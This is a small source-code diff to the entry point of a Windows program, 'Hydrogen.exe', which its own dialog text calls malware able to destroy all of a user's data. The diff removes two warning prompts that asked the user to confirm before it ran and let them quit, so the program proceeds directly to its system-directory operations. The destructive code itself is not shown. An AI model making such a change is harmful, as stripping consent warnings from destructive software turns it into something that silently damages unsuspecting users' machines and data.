@@ -18,15 +18,6 @@ int WinMain(
 	_In_ LPSTR lpCmdLine,
 	_In_ int nShowCmd
 ) {
-	int msgResult = MessageBox(NULL, L"What you have just executed is a malware.\nYou might lose all of your data if you continue!\nStill execute it?", L"Hydrogen.exe", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
-	if (msgResult != IDYES) {
-		ExitProcess(0);
-	}
-	msgResult = MessageBox(NULL, L"THIS IS THE LAST WARNING!\nTHE CREATOR OF THIS MALWARE WILL NOT BE RESPONSIBLE FOR ANY DESTRUCTION CAUSED BY THIS MALWARE!\nSTILL CONTINUE?", L"Hydrogen.exe - LAST WARNING", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
-	if (msgResult != IDYES) {
-		ExitProcess(0);
-	}
-
 	WCHAR SystemDirectory[MAX_PATH] = { 0 };
 	GetSystemDirectory(SystemDirectory, MAX_PATH);
 
